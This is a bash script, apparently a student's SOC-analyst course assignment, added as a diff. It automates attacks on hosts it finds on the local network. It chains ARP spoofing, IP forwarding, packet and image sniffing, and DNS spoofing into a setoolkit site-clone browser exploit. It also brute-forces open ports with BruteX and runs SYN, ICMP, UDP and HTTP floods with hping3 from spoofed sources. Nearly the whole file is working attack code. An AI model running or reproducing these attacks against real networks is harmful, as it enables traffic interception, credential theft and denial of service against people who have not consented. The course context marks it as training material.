@@ -1,0 +1,438 @@
+#!/bin/bash
+
+# Student name: Efi Kozinski
+# Student Code: <S3>
+# Class: TMAGEN77369
+# Lecturer: Simon Bar
+
+#Installations function is used to install the relevant command and programs.
+#note: not all programs are installed in this function. BruteX is installed in the relevant function only.
+installations () {
+
+	sudo apt update &>/dev/null
+	sudo apt install -y ipcalc &>/dev/null
+	sudo apt-get install -y nmap &>/dev/null
+	sudo apt-get install -y gnome-terminal &>/dev/null
+	sudo apt-get install -y driftnet &>/dev/null
+	sudo apt-get install -y dsniff &>/dev/null
+	sudo apt-get install -y hping3 &>/dev/null
+}
+
+#Banner function has 2 uses: 1) displaying the tools and attack names and options. 2) declare the installation function.
+ban() {
+	figlet "SOC ANALYST"
+	
+	echo "~~Created by Efi Kozinski"
+	echo ""
+	echo "~~This tool will help to run and test 3 types of attack:"
+	sleep 1
+	echo "~~1. Brute-Force Attack on an open port (a selected 1 or all of them)"
+	echo "~~the Brute-Force attack uses BruteX git."
+	echo "~~Using default wordlists"
+	echo ""
+	sleep 1
+	echo "~~2. MitM attack - man in the middle"
+	echo "~~Using arpspoof tool as a base for the attacks and then choosing which attack to execute: "
+	echo "  (Cache poisoning with) dnsspoof into setoolkit,(sniff with) tshark,(image retriever) driftnet tools, "
+	echo "   pick one in random or ALL of them at once "
+	echo ""
+	sleep 1
+	echo "~~3. DoS Attack - Denial of Service"
+	echo "~~TCP SYN Flood Attack - using hping3 tool to send the SYN requests. ##WARNING!!!! MAY CAUSE TROUBLE RUNNING OTHER APPS##"
+	echo "~~UDP/ICMP/HTTP Flood Attack - sending a vast amount of packets to the victim using hping3 tool. ##WARNING!!!! MAY CAUSE TROUBLE RUNNING OTHER APPS##"
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	sleep 3
+	echo "## Updating and Installing Relevant tools ##"
+	echo "~~Might take a minute..."
+	echo ""
+	installations	
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+
+}
+
+#This function is used to collect data from the current network (IP, subnet mask, router ip...)
+#in addition this function displays the current active IPs on the network as a menu
+DATACOLLECTION () {
+
+	#Getting current machine info - ip, newwotk, router(the lowest is most likely to be the router) using ipcalc tool.
+	echo "## Collecting OS relevant information : "
+	cur_ip=$(ifconfig eth0 | grep "inet " | awk '{print $2}')
+	echo "*** Current ip: $cur_ip"
+	cur_net=$(ipcalc $cur_ip | grep "Network" | awk '{print $2}')
+	echo "*** Current Network: $cur_net"
+	router_ip=$(ipcalc $cur_ip |grep "HostMin" | awk '{print $2}')
+	echo "*** Current Router IP: $router_ip"
+	#using nmap to ping scan current net for active devices and saving the list in a variable.
+	ip_array=$(nmap -sn $cur_net | grep -o -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | grep -v -E "$cur_ip")
+	
+	#creating an array for the ips detected
+	arr=(`echo ${ip_array}`)
+	
+	#Displaying all located IPs menu with the array
+	echo "# Detected IPs on your network : "
+	
+	for i in ${!arr[@]}; do
+		echo "~$i~ ${arr[$i]}" 	
+	done
+	
+	#Giving the user an option to select the IP he wants to attack, or to pick at random
+	read -p "# Select an IP to attack [ r for random ] : " pick
+	
+	
+	#Conditioning the selection "pick"- if a numerical digit then pick it from the array, if a string "r" randomize the choice from the array. 
+
+	if  [[ $pick =~ ^[0-9]+$ ]] ; then
+		#Saving the choice in the IP variable
+		IP=${arr[$pick]} 
+	elif [[ ${pick,,} == r ]] ; then
+		#Saving the choice in the IP variable
+		IP=${arr[RANDOM%${#arr[@]}]}
+		echo "*Random Roll - IP : $IP"
+	else 
+		echo "Invalid Input!"
+		exit 1
+	fi
+	
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	
+	
+}
+
+#the menu function calls all the other attack functions and declares the "DATACOLECTION" function
+#Display the attack menu and execute the functions of the attack by the user selection
+menu () {
+	DATACOLLECTION 
+	
+	echo "# SOC Checker Attacks :"
+	echo "~1~ MitM "
+	echo "~2~ Bruteforce "
+	echo "~3~ DoS Attack"
+	echo "~4~ Random Attack [ From the 3 above ]"
+	
+	read -p "# Choose the attack you wish to start : " ch
+	
+	#creating an array for the menu to get a random valuse
+	ch_array=("MITM" "BRUTEFORCE" "dos_attack")
+	ch_random=${ch_array[RANDOM%${#ch_array[@]}]}
+	
+	
+	case $ch in
+		1) MITM ;;
+		2) BRUTEFORCE ;;
+		3) dos_attack ;;
+		4) echo "*Random roll - Main Attack : $ch_random" && $ch_random ;;
+		*) echo "Invalid input" && exit 1 ;;
+	esac
+
+}
+
+MITM () {
+	cd SOC_Analyst
+	#Saving the attack in var/log/SOC.log
+	echo "$(date)   $cur_ip --> $IP - MitM Attack Executed" >> /var/log/SOC.log
+	echo "## MitM Attack ##"
+	echo "## 1. Arp poisoning - This attack works by confusing the router and the victim into thinking you are the other."
+	echo "## The victim will think you ($cur_ip) are the router ($router_ip), and the router will think you are the victim."
+	echo ""
+	echo "## 2. IP Forwarding - Receiving and forwarding packets to their destination,"
+	echo "## so the traffic won't stop on the client side."
+	echo ""
+	echo "## 3. Using 1 and 2 to capture, manipulate the data and execute the attack"
+	sleep 5
+	step_1 () {
+		#Saving the attack in var/log/SOC.log
+		echo "$(date)   $cur_ip --> $IP -- Arp Poisoning" >> /var/log/SOC.log
+		#Step 1 - ARP poisoning -  making the victim think i'm the router and the router think i'm the victim.
+		echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+		echo "## ARP poisoning the router and the victim."
+		echo "## making the router think i'm the victim"
+		echo "## and making the victim think i'm the router"
+		sleep 2
+		to_router="sudo arpspoof -i eth0 -t $IP $router_ip"
+		from_router="sudo arpspoof -i eth0 -t $router_ip $IP"
+		gnome-terminal --command="bash -c '$to_router';$SHELL"
+		gnome-terminal --command="bash -c '$from_router';$SHELL"
+		
+		
+	}
+	
+	step_2 () {
+
+		#step 2 - Forwarding - allowing all packet received forwarding to the designated ip(setting the value from 0 to 1)
+		echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+		echo "## Enabling packet forwarding."
+		echo "## Setting a value of 1 in file /proc/sys/net/ipv4/ip_forward"
+		echo "## to forward packets to their designated IP, with no interference"
+		sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+		#Saving the attack in var/log/SOC.log
+		echo "$(date)   $cur_ip --> $IP -- IP Forwarding" >> /var/log/SOC.log
+	}
+	
+	
+	step_3 () {
+		
+		#Step 3 - using step_1 and step _2 to capture and change data done online by the victim.
+		driftnet_run () {
+			#Saving the attack in var/log/SOC.log
+			echo "$(date)   $cur_ip --> $IP -- **Driftnet Used" >> /var/log/SOC.log
+			echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+			echo "## Using DriftNet tool to receive intercepted images"
+			echo "## ***Opening DriftNet in a new window for monitoring***"
+			sleep 4
+			#Executing the command in a new window for monitoring purposes
+			gnome-terminal --command="bash -c 'sudo driftnet';$SHELL"
+		}
+		
+		#this attack is to monitor the activity of the victim
+		tshark_run () {
+			#Saving the attack in var/log/SOC.log
+			echo "$(date)   $cur_ip --> $IP -- **Tshark Used" >> /var/log/SOC.log
+			echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+			echo "## Running Tshark scan which gives more information about the packets"
+			echo "## and saves it into a .pcap file to research"
+			echo "## ***Opening Tshark in a new window for monitoring***"
+			sleep 4
+			#Executing the command in a new window for monitoring purposes
+			gnome-terminal --command="bash -c 'tshark -i eth0 -w Tshark-scan.pcap & tshark -i eth0 | grep "$IP"';$SHELL"
+		}	
+	
+		DNS_spoof () {
+			#Saving the attack in var/log/SOC.log
+			echo "$(date)   $cur_ip --> $IP -- **DNS Cache Poisoning" >> /var/log/SOC.log
+			echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+			echo "## Every time the victim will try accessing this site he will reach $cur_ip instead [example: www.facebook.com]"
+			sleep 2
+			read -p "# Choose a site to clone[www.exemple.com] : " site
+			
+			#creating a file for the dns spoof to set the site recognition as the current ip.
+			echo "$site	$cur_ip" >> dns_sp
+			echo "$cur_ip	$site" >> dns_sp
+			
+			#Executing the command in a new window for monitoring purposes
+			gnome-terminal --command="bash -c 'dnsspoof -i eth0 -f dns_sp';$SHELL"
+			
+			echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+			#reading the selection from the user to exploit or not the DNS poisoning
+			read -p "Do you wish to Exploit $IP via the DNS cache poisoning? [y/n]" dc
+			if [[ ${dc,,} == y ]];then
+				#Saving the attack in var/log/SOC.log
+				echo "$(date)   $cur_ip --> $IP -- ***Setoolkit Activated" >> /var/log/SOC.log
+				#Executing Setoolkit:Social-Engineering Attacks -> Website Attack Vectors -> Metasploit Browser Exploit Method -> Site Cloner -> setting the info for the attack.
+				xdotool key 1 KP_Enter 2 KP_Enter 2 KP_Enter 2 KP_Enter && xdotool type yes && xdotool key KP_Enter && xdotool type $IP && xdotool key KP_Enter && xdotool type no && xdotool key KP_Enter && xdotool type $site && xdotool key KP_Enter && xdotool type 46 && xdotool key KP_Enter && xdotool key 2 KP_Enter KP_Enter && sudo setoolkit
+			
+			elif [[ ${dc,,} == n ]]; then
+				exit 1
+			fi
+			
+		}
+		
+		all_run () {
+
+			driftnet_run && tshark_run && DNS_spoof
+		
+		}
+	
+	
+		mitm_menu () {
+			
+			#declaring step_1 and step_2 
+			step_1
+			sleep 3
+			step_2
+			sleep 3
+			#display the mitm attack type menu
+			echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+			echo "## Now you can intercept the packets transferred."
+			echo "# Here are 3 methods : "
+			echo "~1~ DriftNet - Get images from the packets"
+			echo "~2~ TShark - Get more information about the packets"
+			echo "~3~ DNS Cache Poisoning - making current IP seem as site IP"
+			echo "~~~ additionally try to exploit the DNS cache poisoning with social engineering toolkit"
+			echo "~4~ Random"
+			echo "~5~ ALL"
+		
+			read -p "Select your interception : " mitm_ch
+			
+			#creating an array of the menu to execute a random selection
+			M_array=("driftnet_run" "tshark_run" "DNS_spoof")
+			M_random=${M_array[RANDOM%${#M_array[@]}]}
+
+			#declare the attack function by the selected type
+			case $mitm_ch in
+				1) driftnet_run ;;
+				2) tshark_run ;;
+				3) DNS_spoof ;;
+				4) $M_random ;;
+				5) all_run ;;
+				*) echo "Invalid Input" && exit 1 ;;
+			esac
+		
+		}
+	
+		mitm_menu
+	
+	}
+
+	step_3
+	sudo echo 0 > /proc/sys/net/ipv4/ip_forward
+}
+
+
+BRUTEFORCE () {
+	#Saving the attack in var/log/SOC.log
+	echo "$(date)   $cur_ip --> $IP - Brute-Force Attack Executed" >> /var/log/SOC.log
+	
+	echo "## BruteForce ##"
+	echo "## The tool uses different combinations of user and password from default lists "
+	echo "## while trying to access open ports repeatedly or a single port (The open ports are found by nmap)"
+	
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	cd SOC_Analyst
+	
+	#Using nmap to detect open ports
+	
+	read -p "# Do you wish to Bruteforce?[y/n] : " mc
+	if [[ ${mc,,} == y ]];then
+	
+		
+		#installing the BruteX 
+		
+		git clone https://github.com/1N3/BruteX.git &>/dev/null
+		cd BruteX
+		sudo ./install.sh &>/dev/null
+		
+		#creating a port array for the user selection
+		bp_array=$(nmap -Pn $IP --open | sed  -n '6,$p' | head -n -3 | awk -F '/' '{print $1}' |  grep -E '^[0-9]+$' )
+
+		sbp_arr=(`echo ${bp_array}`)
+
+		echo "# Detected open ports found on $IP address : "
+			
+		#Display the open port menu
+		for f in ${!sbp_arr[@]}; do
+			
+			echo "~$f~ ${sbp_arr[$f]}"
+		done
+		
+		#Receiving the user selection
+		read -p "# Do you wish to Brute-Force a single port or all ports? [ s-single / a-all] :" bc
+		
+		if [[ ${bc,,} == s ]];then
+			
+			#reading the user port selection
+			read -p "# Enter the port you wish to attack [ select ~index~ ] : " at
+			echo "$(date)   $cur_ip --> $IP -- Brute-Force Attack on Open Port Number ${sbp_arr[$at]}" >> /var/log/SOC.log
+			echo "## Executing BruteX on port ${sbp_arr[$at]}"
+			sleep 2
+			
+			brutex $IP ${sbp_arr[$at]}
+			
+		
+		elif [[ ${bc,,} == a ]]; then
+			#Saving the attack in var/log/SOC.log
+			echo "$(date)   $cur_ip --> $IP -- Brute-Force Attack on All Open Ports" >> /var/log/SOC.log
+			brutex $IP
+		else
+			echo "Invalid Input"
+		
+		fi
+	#Exit if the answer is "n" from the user, exit from the script
+	elif [[ ${mc,,} == n ]]; then
+		exit 1
+	fi
+
+}
+
+dos_attack () {
+	#Saving the attack in var/log/SOC.log
+	echo "$(date)   $cur_ip --> $IP - DOS Attack was executed" >> /var/log/SOC.log
+	cd SOC_Analyst
+	
+	echo "## DOS_Attack ##"
+	echo "## TCP SYN Attack - Flooding the victim with TCP SYN packets (1st step of the 3-way hand shake) which the victim has to answer."
+	echo "##                  this is making hard for the machine to receive and reply to legit SYN packets." 
+	echo "##                    "
+	echo "## Flood DoS Attack - Flooding the victim traffic by sending vast amount of packets "
+	echo "##                    ICMP (ping) Flood, UDP Flood and HTTP Flood"
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	
+	#Creating a port array to display in the menu
+	p_array=$(nmap -Pn $IP --open | sed  -n '6,$p' | head -n -3 | awk -F '/' '{print $1}' |  grep -E '^[0-9]+$' )
+
+	sp_arr=(`echo ${p_array}`)
+
+
+	syn_port_menu () {
+
+		echo "# Open ports detected by Nmap :"
+		#displaying the port with the array
+        	for i in ${!sp_arr[@]}; do
+
+        	        echo "~$i~ ${sp_arr[$i]}"
+        	done
+        	read -p "# Choose the open port you wish to attack : " po
+
+        	#Saving the action in var/log/SOC.log
+        	echo "$(date)   $cur_ip --> $IP -- TCP SYN DoS Attack on port:${sp_arr[$po]}" >> /var/log/SOC.log
+
+        	
+        	#Executing hping3 on the victim IP
+        	echo "# Executing attack $IP, on port ${sp_arr[$po]}"
+        	sleep 2
+		sudo hping3 -d 120 -S -w 64 -p ${sp_arr[$po]} --flood --rand-source $IP
+	}
+
+	
+	type_hp3 (){
+		#the menu to choose the type of packets to send
+		echo "# Choose the type of flood you wish to execute"	
+		echo "~1~ ICMP Flood"
+		echo "~2~ UDP Flood"
+		echo "~3~ HTTP Flood"
+		read -p "# Your choice:" pkt
+		echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+		echo "$(date)   $cur_ip --> $IP -- Flood DoS Attack" >> /var/log/SOC.log
+		
+		#Executing hping3 on the victim with the selected type
+		case $pkt in
+			1) echo "$(date)   $cur_ip --> $IP -- **ICMP Flood DoS Attack " >> /var/log/SOC.log && sudo hping3 --flood --rand-source --icmp $IP
+			;;
+			2) echo "$(date)   $cur_ip --> $IP -- **UDP Flood DoS Attack "  >> /var/log/SOC.log && sudo hping3 --flood --rand-source --udp $IP
+			;;
+			3) echo "$(date)   $cur_ip --> $IP -- **HTTP Flood DoS Attack" >> /var/log/SOC.log && sudo hping3 --flood --rand-source -p 80 $IP
+			;;
+			*) echo "Invalid Input" exit 1 ;;
+	
+		esac
+	}
+	
+	#Displaying the DoS attack type  Menu to the user
+	echo "# What type of DOS attack you wish to execute?"
+	echo "~1~ TCP SYN DoS Attack"
+	echo "~2~ Flood DoS Attak"
+	
+	#reading the attack type from the user and declaring the attack function by the user choice
+	read -p "# Choose your attack : " dos_p
+	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	
+	case $dos_p in
+	
+		1) syn_port_menu
+		;;
+		2) type_hp3
+		;;
+		*) echo "Invalid Input" exit
+		;;
+	esac
+	
+}
+
+#this is the main function which calls the "menu" and "ban" functions
+main () {
+	ban
+	mkdir SOC_Analyst
+	menu
+}
+
+#declaring the main function
+main
